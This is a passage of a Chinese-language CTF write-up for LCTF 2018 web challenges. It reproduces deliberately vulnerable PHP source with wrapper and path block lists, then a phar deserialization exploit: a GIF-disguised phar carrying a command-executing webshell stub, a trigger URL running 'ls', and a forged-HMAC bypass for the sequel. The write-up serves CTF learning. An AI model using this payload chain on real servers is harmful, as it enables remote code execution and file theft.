class="string">'url'</span>]))&#123;</span><br><span class="line">         <span class="keyword">if</span>(preg_match(<span class="string">'/^(http|https).*/i'</span>, $_GET[<span class="string">'url'</span>]))&#123;</span><br><span class="line">            $data = file_get_contents($_GET[<span class="string">"url"</span>] . <span class="string">"/avatar.gif"</span>);                                                                                     </span><br><span class="line">            <span class="keyword">if</span> (substr($data, <span class="number">0</span>, <span class="number">6</span>) !== <span class="string">"GIF89a"</span>)&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"Fuck off"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            file_put_contents($path . <span class="string">"/avatar.gif"</span>, $data);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Upload OK"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Hacker"</span>);</span><br><span class="line">        &#125;           </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Miss the URL~~"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( !is_dir($path) || !file_exists($path . <span class="string">"/avatar.gif"</span>)) &#123;</span><br><span class="line">           </span><br><span class="line">        $path = <span class="string">"/var/www"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">"Content-Type: image/gif"</span>);</span><br><span class="line">    <span class="keyword">die</span>(file_get_contents($path . <span class="string">"/avatar.gif"</span>));                     </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($path)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/^(ftp|php|zlib|data|glob|phar|ssh2|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file)(.|\\s)*/i'</span>,$_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Hacker Hacker Hacker"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $file_path = $_GET[<span class="string">'c'</span>];</span><br><span class="line">            <span class="keyword">list</span>($width, $height, $type) = @getimagesize($file_path);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Width is ："</span> . $width.<span class="string">" px&lt;br&gt;"</span> .</span><br><span class="line">                <span class="string">"Height is ："</span> . $height.<span class="string">" px&lt;br&gt;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">list</span>($width, $height, $type) = @getimagesize($path.<span class="string">"/avatar.gif"</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Width is ："</span> . $width.<span class="string">" px&lt;br&gt;"</span> .</span><br><span class="line">            <span class="string">"Height is ："</span> . $height.<span class="string">" px&lt;br&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">move</span><span class="params">($source_path,$dest_name)</span></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $FILEBOX;</span><br><span class="line">    $dest_path = $FILEBOX . <span class="string">"/"</span> . $dest_name;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/(log|etc|session|proc|root|secret|www|history|file|\.\.|ftp|php|phar|zlib|data|glob|ssh2|rar|ogg|expect|http|https)/i'</span>,$source_path))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Hacker Hacker Hacker"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(copy($source_path,$dest_path))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Successful copy"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Copy failed"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$mode = $_GET[<span class="string">"m"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($mode == <span class="string">"upload"</span>)&#123;</span><br><span class="line">     upload(check_session());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ($mode == <span class="string">"show"</span>)&#123;</span><br><span class="line">    show(check_session());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ($mode == <span class="string">"check"</span>)&#123;</span><br><span class="line">    check(check_session());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>($mode == <span class="string">"move"</span>)&#123;</span><br><span class="line">    move($_GET[<span class="string">'source'</span>],$_GET[<span class="string">'dest'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"./comments.html"</span>);</span><br></pre></td></tr></table></figure></p>
+<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>先看看几个函数的功能:</p>
+<ul>
+<li><code>check_session</code>检查签名，并且返回一个路径值</li>
+<li><code>upload</code>用来上传文件，题目开了<code>allow_url_fopen</code>，可以读取远端文件的内容，然后写到指定的位置，文件名是被限制死的</li>
+<li><code>show</code>用来查看文件</li>
+<li><code>check</code>用来检查文件，注意这里的<code>getimagesize</code>，瞬间就要想到phar反序列化</li>
+<li><code>move</code>完成一个复制的过程<br>先来看看<code>check_session</code>返回的路径，把cookie拿出来扔给它就可以了。<img src="https://www.github.com/coomrade/Img/raw/master/pics/1542664646420.png" alt="enter description here">这个结果就是传进各个函数中的<code>$path</code>。突然发现，<code>check</code>的waf并没有想象中那么严格，只匹配了开头，给了phar一条活路<img src="https://www.github.com/coomrade/Img/raw/master/pics/1542664947176.png" alt="enter description here">为啥说给了一条活路呢，请看<a href="https://blog.zsxsoft.com/post/38" target="_blank" rel="noopener">这篇</a><img src="https://www.github.com/coomrade/Img/raw/master/pics/1542665037199.png" alt="enter description here">很明显，出题人是看了zsx大佬的博客得到的出题灵感。接下来思路很清晰，用<code>upload</code>函数把phar传上去，然后调用<code>check</code>函数，用phar协议结合<code>getimagesize</code>触发反序列化。</li>
+</ul>
+<h2 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h2><p>生成phar<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line">class K0rz3n_secret_flag&#123;</span><br><span class="line">    protected $file_path=&apos;../data/6bf34a39764d154948e41c42b7bbd29c&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@unlink(&apos;shell.phar&apos;);</span><br><span class="line">$phar=new Phar(&apos;shell.phar&apos;);</span><br><span class="line">$phar-&gt;startBuffering();</span><br><span class="line">$phar-&gt;addFromString(&apos;te.txt&apos;,&apos;asd&apos;);</span><br><span class="line">$phar-&gt;setStub(&quot;GIF89a&quot;.&apos;&lt;?php echo `$_GET[1]`;__HALT_COMPILER(); ?&gt;&apos;);</span><br><span class="line">$o=new K0rz3n_secret_flag();</span><br><span class="line">$phar-&gt;setMetaData($o);</span><br><span class="line">$phar-&gt;stopBuffering();</span><br><span class="line"></span><br><span class="line"> ?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>放到VPS上，改名为<code>avatar.gif</code>，然后上传<img src="https://www.github.com/coomrade/Img/raw/master/pics/1542665361158.png" alt="enter description here">然后check触发反序列化<code>http://192.168.222.201/T4lk%201s%20ch34p,sh0w%20m3%20the%20sh31l/www/html/LCTF.php?m=check&amp;c=compress.zlib://phar://../data/6bf34a39764d154948e41c42b7bbd29c/avatar.gif/asd&amp;1=ls</code><img src="https://www.github.com/coomrade/Img/raw/master/pics/1542665936017.png" alt="enter description here">最后用<code>grep -r</code>在/etc目录下找到flag<img src="https://www.github.com/coomrade/Img/raw/master/pics/1542666398560.png" alt="enter description here"></p>
+<h1 id="sh0w-m3-the-sh31l-4ga1n"><a href="#sh0w-m3-the-sh31l-4ga1n" class="headerlink" title="sh0w m3 the sh31l 4ga1n"></a>sh0w m3 the sh31l 4ga1n</h1><p>description:</p>
+<blockquote>
+<p>Real hackers won’t be fooled by filtering<br>ps:The only way you can get the flag is to use grep to check all the folders in the / </p>
+</blockquote>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$SECRET  = `../read_secret`;                                  </span><br><span class="line">$SANDBOX = <span class="string">"../data/"</span> . md5($SECRET. $_SERVER[<span class="string">"REMOTE_ADDR"</span>]);</span><br><span class="line">$FILEBOX = <span class="string">"../file/"</span> . md5(<span class="string">"K0rz3n"</span>. $_SERVER[<span class="string">"REMOTE_ADDR"</span>]);   </span><br><span class="line">@mkdir($SANDBOX);</span><br><span class="line">@mkdir($FILEBOX);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_COOKIE[<span class="string">"session-data"</span>])) &#123;</span><br><span class="line">    $data = serialize(<span class="keyword">new</span> User($SANDBOX));</span><br><span class="line">    $hmac = hash_hmac(<span class="string">"md5"</span>, $data, $SECRET);</span><br><span class="line">    setcookie(<span class="string">"session-data"</span>, sprintf(<span class="string">"%s-----%s"</span>, $data, $hmac));      </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $avatar;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;avatar = $path;                                          </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">K0rz3n_secret_flag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span> $file_path;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/(log|etc|session|proc|data|read_secret|history|class|\.\.)/i'</span>, <span class="keyword">$this</span>-&gt;file_path))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Sorry Sorry Sorry"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">include_once</span>(<span class="keyword">$this</span>-&gt;file_path);</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_session</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $SECRET;</span><br><span class="line">    $data = $_COOKIE[<span class="string">"session-data"</span>];</span><br><span class="line">    <span class="keyword">list</span>($data, $hmac) = explode(<span class="string">"-----"</span>, $data, <span class="number">2</span>);</span><br><span class="line">    <span class="keyword">if</span> (!<span class="keyword">isset</span>($data, $hmac) || !is_string($data) || !is_string($hmac))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Bye"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !hash_equals(hash_hmac(<span class="string">"md5"</span>, $data, $SECRET), $hmac) )&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Bye Bye"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $data = unserialize($data);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( !<span class="keyword">isset</span>($data-&gt;avatar) )&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Bye Bye Bye"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $data-&gt;avatar;                                               </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">upload</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'url'</span>]))&#123;</span><br><span class="line">         <span class="keyword">if</span>(preg_match(<span class="string">'/^(http|https).*/i'</span>, $_GET[<span class="string">'url'</span>]))&#123;</span><br><span class="line">            $data = file_get_contents($_GET[<span class="string">"url"</span>] . <span class="string">"/avatar.gif"</span>);                                                                                     </span><br><span class="line">            <span class="keyword">if</span> (substr($data, <span class="number">0</span>, <span class="number">6</span>) !== <span class="string">"GIF89a"</span>)&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">"Fuck off"</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            file_put_contents($path . <span class="string">"/avatar.gif"</span>, $data);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Upload OK"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Hacker"</span>);</span><br><span class="line">        &#125;           </span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Miss the URL~~"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">show</span><span class="params">($path)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> ( !is_dir($path) || !file_exists($path . <span class="string">"/avatar.gif"</span>)) &#123;</span><br><span class="line">           </span><br><span class="line">        $path = <span class="string">"/var/www"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    header(<span class="string">"Content-Type: image/gif"</span>);</span><br><span class="line">    <span class="keyword">die</span>(file_get_contents($path . <span class="string">"/avatar.gif"</span>));                     </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($path)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">'/^(ftp|php|zlib|data|glob|phar|ssh2|rar|ogg|expect)(.|\\s)*|(.|\\s)*(file|data|\.\.)(.|\\s)*/i'</span>,$_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Hacker Hacker Hacker"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            $file_path = $_GET[<span class="string">'c'</span>];</span><br><span class="line">            <span class="keyword">list</span>($width, $height, $type) = @getimagesize($file_path);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Width is ："</span> . $width.<span class="string">" px&lt;br&gt;"</span> .</span><br><span class="line">                <span class="string">"Height is ："</span> . $height.<span class="string">" px&lt;br&gt;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">list</span>($width, $height, $type) = @getimagesize($path.<span class="string">"/avatar.gif"</span>);</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Width is ："</span> . $width.<span class="string">" px&lt;br&gt;"</span> .</span><br><span class="line">            <span class="string">"Height is ："</span> . $height.<span class="string">" px&lt;br&gt;"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">move</span><span class="params">($source_path,$dest_name)</span></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $FILEBOX;</span><br><span class="line">    $dest_path = $FILEBOX . <span class="string">"/"</span> . $dest_name;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/(log|etc|session|proc|root|secret|www|history|file|\.\.|ftp|php|phar|zlib|data|glob|ssh2|rar|ogg|expect|http|https)/i'</span>,$source_path))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"Hacker Hacker Hacker"</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(copy($source_path,$dest_path))&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Successful copy"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"Copy failed"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$mode = $_GET[<span class="string">"m"</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ($mode == <span class="string">"upload"</span>)&#123;</span><br><span class="line">     upload(check_session());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ($mode == <span class="string">"show"</span>)&#123;</span><br><span class="line">    show(check_session());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ($mode == <span class="string">"check"</span>)&#123;</span><br><span class="line">    check(check_session());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>($mode == <span class="string">"move"</span>)&#123;</span><br><span class="line">    move($_GET[<span class="string">'source'</span>],$_GET[<span class="string">'dest'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    </span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);    </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span>(<span class="string">"./comments.html"</span>);</span><br></pre></td></tr></table></figure>
+<h2 id="假的secret"><a href="#假的secret" class="headerlink" title="假的secret"></a>假的secret</h2><p>这题相比起<code>T4lk 1s ch34p,sh0w m3 the sh31l</code>难度增加了不少，加强了waf<img src="https://www.github.com/coomrade/Img/raw/master/pics/1542650677828.png" alt="enter description here">不能用<code>..和data</code>,导致上一道题的包含自身的思路不能再用了，要另辟蹊径。在上一道题getshell之后发现，<code>read_secret</code>其实就是一串字符串，但是这里获取它的方法却是执行系统命令<img src="https://www.github.com/coomrade/Img/raw/master/pics/1542650911398.png" alt="enter description here">这也就导致了它返回的是一个<code>null</code>,从而导致签名可以伪造。<img src="https://www.github.com/coomrade/Img/raw/master/pics/1542651076642.png" alt="enter description here">伪造签名：<img src="https://www.github.com/coomrade/Img/raw/master/pics/1542651894543.png" alt="enter description here">此时<code>check_session</code>返回的就是<code>/tmp</code>了。于是这时候我们upload就是upload到/tmp目录下了，绕过了<code>file_path</code>的waf。再继续像上题一样包含即可。要注意这里/tmp目录会不停清文件，但是问题不大，开着burp轻轻地爆破，然后这边一样执行命令就可以了。<img src="https://www.github.com/coomrade/Img/raw/master/pics/1542654250681.png" alt="enter description here"></p>
+<h2 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h2><p>看到flag就知道，这个一样不是预期解。预期解在<a href="http://www.k0rz3n.com/2018/11/19/LCTF%202018%20T4lk%201s%20ch34p,sh0w%20m3%20the%20sh31l%20%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">这里</a>。</p>
+<h1 id="L-playground2"><a href="#L-playground2" class="headerlink" title="L playground2"></a>L playground2</h1><p><img src="https://www.github.com/coomrade/Img/raw/master/pics/1542654727234.png" alt="enter description here">点进去看到源码<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">http_schema = re.compile(<span class="string">r"https?"</span>)</span><br><span class="line">url_parser = re.compile(<span class="string">r"(\w+)://([\w\-@\.:]+)/?([\w/_\-@&amp;\?\.=%()]+)?(#[\w\-@&amp;_\?()/%]+)?"</span>)</span><br><span class="line">base_dir = os.path.dirname(os.path.abspath(__file__))</span><br><span class="line">sandbox_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), <span class="string">"sandbox"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse_file</span><span class="params">(path)</span>:</span></span><br><span class="line">    filename = os.path.join(sandbox_dir, path)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"./"</span> <span class="keyword">in</span> filename <span class="keyword">or</span> <span class="string">".."</span> <span class="keyword">in</span> filename:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"invalid content in url"</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> filename.startswith(base_dir):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"url have to start with %s"</span> % base_dir</span><br><span class="line">    <span class="keyword">if</span> filename.endswith(<span class="string">"py"</span>) <span class="keyword">or</span> <span class="string">"flag"</span> <span class="keyword">in</span> filename:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"invalid content in filename"</span></span><br><span class="line">    <span class="keyword">if</span> os.path.isdir(filename):</span><br><span class="line">        file_list = os.listdir(filename)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">", "</span>.join(file_list)</span><br><span class="line">    <span class="keyword">elif</span> os.path.isfile(filename):</span><br><span class="line">        <span class="keyword">with</span> open(filename, <span class="string">"rb"</span>) <span class="keyword">as</span> f:</span><br><span class="line">            content = f.read()</span><br><span class="line">        <span class="keyword">return</span> content</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"can't find file"</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">parse</span><span class="params">(url)</span>:</span></span><br><span class="line">    fragments = url_parser.findall(url)</span><br><span class="line">    <span class="keyword">if</span> len(fragments) != <span class="number">1</span> <span class="keyword">or</span> len(fragments[<span class="number">0</span>]) != <span class="number">4</span>:</span><br><span class="line">        <span class="keyword">return</span>(<span class="string">"invalid url"</span>)</span><br><span class="line">    schema = fragments[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    host = fragments[<span class="number">0</span>][<span class="number">1</span>]</span><br><span class="line">    path = fragments[<span class="number">0</span>][<span class="number">2</span>]</span><br><span class="line">    <span class="keyword">if</span> http_schema.match(schema):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"It's a valid http url"</span></span><br><span class="line">    <span class="keyword">elif</span> schema == <span class="string">"file"</span>:</span><br><span class="line">        <span class="keyword">if</span> host != <span class="string">"sandbox"</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"wrong file path"</span></span><br><span class="line">        <span class="keyword">return</span> parse_file(path)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"unknown schema"</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/sandbox')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">render_static</span><span class="params">()</span>:</span></span><br><span class="line">    url = request.args.get(<span class="string">"url"</span>)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> url <span class="keyword">is</span> <span class="keyword">None</span> <span class="keyword">or</span> url == <span class="string">""</span>:</span><br><span class="line">            content = <span class="string">"no url input"</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            content = parse(url)</span><br><span class="line">        resp = make_response(content)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        resp = make_response(<span class="string">"url error"</span>)</span><br><span class="line">    resp.mimetype = <span class="string">"text/plain"</span></span><br><span class="line">    <span class="keyword">return</span> resp</span><br></pre></td></tr></table></figure></p>
